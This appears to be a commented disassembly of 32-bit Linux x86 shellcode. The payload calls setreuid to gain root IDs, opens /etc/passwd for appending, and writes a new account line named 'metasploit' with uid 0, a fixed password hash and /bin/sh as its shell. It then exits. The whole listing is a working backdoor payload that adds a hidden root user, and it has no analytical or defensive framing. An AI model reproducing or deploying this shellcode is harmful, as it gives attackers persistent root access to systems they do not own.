00000000  31C9              xor ecx,ecx         ; Zero out ECX
00000002  89CB              mov ebx,ecx         ; Move 0x0 into EBX
00000004  6A46              push byte +0x46     ; Push SYS_SETREUID16 (0x46 / 70 dec) onto the stack
00000006  58                pop eax             ; Pop the system call into EAX
00000007  CD80              int 0x80            ; Call the system call
00000009  6A05              push byte +0x5         ; SYS_OPEN system call
0000000B  58                pop eax                ; pop the system call into EAX
0000000C  31C9              xor ecx,ecx            ; Zero out ECX
0000000E  51                push ecx               ; NULL string terminator
0000000F  6873737764        push dword 0x64777373  ; dwss
00000014  682F2F7061        push dword 0x61702f2f  ; ap//
00000019  682F657463        push dword 0x6374652f  ; cte/
0000001E  89E3              mov ebx,esp            ; arguments pointer into EBX
00000020  41                inc ecx                ; O_WRONLY
00000021  B504              mov ch,0x4             ; O_WRONLY|O_APPEND
00000023  CD80              int 0x80               ; execute the system call
00000025  93                xchg eax,ebx           ; move file descriptor into EBX for the SYS_WRITE call
00000026  E828000000        call 0x53              ; use call for the CALL / POP technique of getting a string
0000002B  6D                insd                   ; m
0000002C  657461            gs jz 0x90             ; eta
0000002F  7370              jnc 0xa1               ; sp
00000031  6C                insb                   ; l
00000032  6F                outsd                  ; o
00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a    ; it:Az/dI
0000003B  736A              jnc 0xa7               ; sj
0000003D  3470              xor al,0x70            ; 4p
0000003F  3449              xor al,0x49            ; 4l
00000041  52                push edx               ; R
00000042  633A              arpl [edx],di          ; c:
00000044  303A              xor [edx],bh           ; 0:
00000046  303A              xor [edx],bh           ; 0:
00000048  3A2F              cmp ch,[edi]           ; :/
0000004A  3A2F              cmp ch,[edi]           ; :/
0000004C  62696E            bound ebp,[ecx+0x6e]   ; bin
0000004F  2F                das                    ; /
00000050  7368              jnc 0xba               ; sh
00000052  0A598B            or bl,[ecx-0x75]       ; Line Feed, POP ECX, MOV
00000055  51                push ecx               ; EDX
00000056  FC                cld                    ; -0x4
00000057  6A04              push byte +0x4         ; SYS_WRITE
00000059  58                pop eax                ; pop the function call into EAX
0000005A  CD80              int 0x80               ; write the data
0000005C  6A01              push byte +0x1         ; SYS_EXIT
0000005E  58                pop eax                ; store the function call in EAX
0000005F  CD80              int 0x80               ; exit cleanly
